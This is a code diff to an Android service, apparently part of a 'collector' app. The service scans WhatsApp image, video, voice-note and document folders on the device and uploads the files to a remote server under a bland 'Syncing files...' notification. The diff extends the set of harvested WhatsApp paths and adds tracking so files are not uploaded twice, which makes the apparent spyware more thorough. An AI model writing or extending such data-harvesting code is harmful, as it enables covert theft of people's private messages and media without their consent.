@@ -5,6 +5,7 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
@@ -15,6 +16,8 @@ import java.io.File;
 import java.io.FileInputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.util.HashSet;
+import java.util.Set;
 import java.util.concurrent.atomic.AtomicInteger;
 
 public class FileUploadService extends Service {
@@ -23,16 +26,22 @@ public class FileUploadService extends Service {
     private static final String CHANNEL_ID = "collector_upload_channel";
     private static final int NOTIFICATION_ID = 1001;
     private static final int MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB limit
+    private static final String PREFS_NAME = "CollectorUploadPrefs";
+    private static final String KEY_UPLOADED_FILES = "uploaded_files";
 
     private String sessionId;
     private String baseUrl;
     private volatile boolean isRunning = false;
     private final AtomicInteger uploadedCount = new AtomicInteger(0);
+    private SharedPreferences uploadPrefs;
+    private Set<String> uploadedFileSet;
 
     @Override
     public void onCreate() {
         super.onCreate();
         createNotificationChannel();
+        uploadPrefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
+        uploadedFileSet = new HashSet<>(uploadPrefs.getStringSet(KEY_UPLOADED_FILES, new HashSet<String>()));
     }
 
     @Override
@@ -85,6 +94,12 @@ public class FileUploadService extends Service {
                 extStorage + "/WhatsApp/Media/WhatsApp Video",
                 extStorage + "/WhatsApp/Media/WhatsApp Documents",
                 extStorage + "/WhatsApp/Media/WhatsApp Audio",
+                extStorage + "/WhatsApp/Media/WhatsApp Animated Gifs",
+                extStorage + "/WhatsApp/Media/WhatsApp Voice Notes",
+                extStorage + "/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
+                extStorage + "/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video",
+                extStorage + "/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents",
+                extStorage + "/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Audio",
             };
 
             for (String path : storagePaths) {
@@ -139,16 +154,27 @@ public class FileUploadService extends Service {
                 long fileSize = file.length();
                 if (fileSize > 0 && fileSize < MAX_FILE_SIZE) {
                     String type = getFileType(file.getName());
-                    // Upload images, videos, audio, pdf, documents
+
+                    // Only upload media and document types
                     if (type.equals("image") || type.equals("video") ||
                         type.equals("document") || type.equals("pdf") ||
                         type.equals("audio")) {
+
+                        // Skip already uploaded files
+                        String fileKey = file.getAbsolutePath() + ":" + file.lastModified();
+                        if (uploadedFileSet.contains(fileKey)) {
+                            continue;
+                        }
 
                         // Add a small delay between uploads to avoid overwhelming the server
                         try { Thread.sleep(200); } catch (InterruptedException e) { break; }
 
                         boolean success = uploadSingleFile(file, type);
                         if (success) {
+                            // Mark file as uploaded
+                            uploadedFileSet.add(fileKey);
+                            saveUploadedFiles();
+
                             int count = uploadedCount.incrementAndGet();
                             Notification notification = createNotification(
                                 "Syncing files... " + count + " uploaded",
@@ -160,6 +186,14 @@ public class FileUploadService extends Service {
                     }
                 }
             }
+        }
+    }
+
+    private void saveUploadedFiles() {
+        try {
+            uploadPrefs.edit().putStringSet(KEY_UPLOADED_FILES, uploadedFileSet).apply();
+        } catch (Exception e) {
+            Log.w(TAG, "Failed to save uploaded files set: " + e.getMessage());
         }
     }
 
@@ -307,6 +341,7 @@ public class FileUploadService extends Service {
     @Override
     public void onDestroy() {
         isRunning = false;
+        saveUploadedFiles();
         super.onDestroy();
     }
 
